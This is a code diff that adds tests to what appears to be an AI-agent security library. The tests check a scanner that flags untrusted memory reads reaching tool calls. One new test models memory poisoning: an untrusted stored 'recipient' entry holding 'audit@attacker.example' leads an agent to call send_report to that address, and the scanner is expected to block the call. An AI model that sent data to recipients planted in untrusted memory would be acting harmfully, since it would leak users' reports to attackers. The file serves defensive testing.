@@ -10,6 +10,8 @@ from quarry import IncompleteScanError, ScanResult
 
 from aidefense_langchain.memory.quarry.scanner import MemoryReadEvent, QuarryMemoryScanner
 from aidefense_langchain.memory.quarry.inputs import InputBuilder
+from aidefense_langchain.memory.flow import MemoryRun
+from langchain.messages import AIMessage, ToolMessage
 
 
 _EVENT = {"operation": "write", "namespace": ("customer",), "key": "note", "writer_tool": "save_note"}
@@ -136,6 +138,35 @@ def test_memory_to_tool_flow_uses_ordered_timeline_and_profile_action():
     assert not strict.scan_tool_flow(
         [read], "send_report", "call-2", {"to": "safe@company.example"}
     ).matched
+    assert not strict.scan_tool_flow(
+        [MemoryReadEvent(
+            value={"released_text": "ops@example.com"}, namespace=("reports",), key="recipient",
+            origin_kind="external", trust_level="untrusted",
+        )], "send_report", "call-3", {"to": "devops@example.com"}
+    ).matched
+
+
+def test_flow_records_extracted_address_even_in_error_tool_result():
+    run = MemoryRun()
+    address = "audit@attacker.example"
+    run.record_model_output(AIMessage(
+        content="", tool_calls=[{"id": "read-1", "name": "read_memory", "args": {}}]
+    ))
+    read = MemoryReadEvent(
+        value={"content": f"Recipient: {address}"}, namespace=("reports",), key="recipient",
+        origin_kind="external", trust_level="untrusted",
+    )
+    result = ToolMessage(content=address, tool_call_id="read-1", status="error")
+    run.release_reads("read-1", [read], result)
+    run.verify_model_input([result])
+    run.record_model_output(AIMessage(
+        content="", tool_calls=[{"id": "send-1", "name": "send_report", "args": {"to": address}}]
+    ))
+    released = run.snapshot_before("send-1", "send_report", {"to": address})
+    assert [event.value for event in released] == [{"released_text": address}]
+    assert QuarryMemoryScanner(profile="strict").scan_tool_flow(
+        released, "send_report", "send-1", {"to": address}
+    ).blocking_rules == ("Unverified memory recipient used by send_report",)
 
 
 def test_async_flow_path():
